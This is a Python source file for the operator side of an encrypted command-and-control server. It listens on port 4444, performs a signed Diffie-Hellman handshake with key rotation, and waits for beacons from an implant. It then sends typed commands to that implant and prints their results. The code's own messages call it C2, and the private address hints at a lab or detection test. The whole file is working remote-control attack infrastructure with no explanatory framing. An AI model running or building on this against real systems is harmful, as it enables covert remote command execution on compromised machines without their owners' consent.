import socket
import base64
import json
import time
import uuid
import threading
import queue

from cryptography.hazmat.primitives.asymmetric import padding, dh
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.fernet import Fernet

with open("server_private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(f.read(), password=None)

parameters = dh.generate_parameters(generator=2, key_size=2048)

HOST = "192.168.100.1"
PORT = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("Server listening...")
conn, addr = server.accept()
print(f"Connected from {addr}")

# ================= HANDSHAKE =================
print("[*] Performing secure handshake...")
dh_private = parameters.generate_private_key()
dh_public = dh_private.public_key()

dh_public_bytes = dh_public.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

signature = private_key.sign(
    dh_public_bytes,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)

conn.send(len(dh_public_bytes).to_bytes(4, 'big'))
conn.send(dh_public_bytes)
conn.send(len(signature).to_bytes(4, 'big'))
conn.send(signature)

client_len = int.from_bytes(conn.recv(4), 'big')
client_bytes = conn.recv(client_len)

client_public = serialization.load_pem_public_key(client_bytes)

shared_key = dh_private.exchange(client_public)

derived_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b'handshake data'
).derive(shared_key)

current_cipher = Fernet(base64.urlsafe_b64encode(derived_key))
print("Secure channel established!")

# ================= INPUT THREAD =================
cmd_queue = queue.Queue()

def input_thread():
    while True:
        cmd = input("Enter command: ")
        cmd_queue.put(cmd)

threading.Thread(target=input_thread, daemon=True).start()

# ================= HELPERS =================
def create_message(msg_type, data):
    return json.dumps({
        "ts": time.time(),
        "nonce": str(uuid.uuid4()),
        "type": msg_type,
        "data": data
    }).encode()

def encrypt(msg):
    return current_cipher.encrypt(msg)

def decrypt(msg):
    return json.loads(current_cipher.decrypt(msg).decode())

# ================= KEY ROTATION =================
def rotate_key():
    global current_cipher

    print("[*] Rotating key...")

    conn.send(encrypt(create_message("KEY_ROTATE_INIT", "")))

    new_private = parameters.generate_private_key()
    new_public = new_private.public_key()

    data = conn.recv(4096)
    parsed = decrypt(data)

    client_pub = serialization.load_pem_public_key(parsed["data"].encode())

    server_pub_bytes = new_public.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    conn.send(encrypt(create_message("KEY_ROTATE_DH", server_pub_bytes.decode())))

    shared = new_private.exchange(client_pub)

    new_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'rotation'
    ).derive(shared)

    current_cipher = Fernet(base64.urlsafe_b64encode(new_key))

    conn.send(encrypt(create_message("KEY_ROTATE_COMMIT", "")))

    print("[+] Rotation completed")

# ================= MAIN LOOP =================
while True:
    try:
        data = conn.recv(4096)
        if not data:
            print("Client disconnected!")
            break

        parsed = decrypt(data)

        if parsed["type"] == "BEACON":
            print("\n[BEACON]:", parsed["data"], flush=True)

            try:
                cmd = cmd_queue.get_nowait()
            except queue.Empty:
                continue

            # Ignore empty commands
            if not cmd or not cmd.strip():
                continue

            # Handle rotation
            if cmd == "rotate_key":
                rotate_key()
                continue

            try:
                conn.send(encrypt(create_message("CMD", cmd)))
            except Exception:
                print("Client blocked connection (C2 detected) !!!")
                break

            if cmd.lower() == "exit":
                break

        elif parsed["type"] == "RESULT":
            print("[RESULT]:\n", parsed["data"])

    except Exception as e:
        if "Connection reset" in str(e) or "Broken pipe" in str(e):
            print("Client blocked connection (C2 detected) !!!")
        else:
            print("Error:", e)
        break

